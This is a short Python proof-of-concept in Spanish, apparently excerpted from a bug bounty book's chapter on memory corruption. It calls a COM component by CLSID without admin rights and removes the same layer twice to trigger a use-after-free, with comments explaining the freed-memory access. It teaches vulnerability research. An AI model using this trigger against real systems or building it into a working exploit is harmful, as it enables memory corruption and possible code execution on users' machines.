# Extraído de: LibroBugBounty/cap-10-memory-corruption.md
import win32com.client

# Instanciar (sin admin)
anim = win32com.client.Dispatch(
    "{756E6C18-79CC-3842-9E47-7C80011D303A}"
)
anim.init(10, 10)

# Crear y añadir un layer
layer = anim.CreateLayer()
anim.AddLayer(layer)

# Primer remove — válido
anim.RemoveLayer(layer)

# Segundo remove — USE AFTER FREE
# Opera sobre memoria ya liberada
anim.RemoveLayer(layer)  # Éxito inesperado
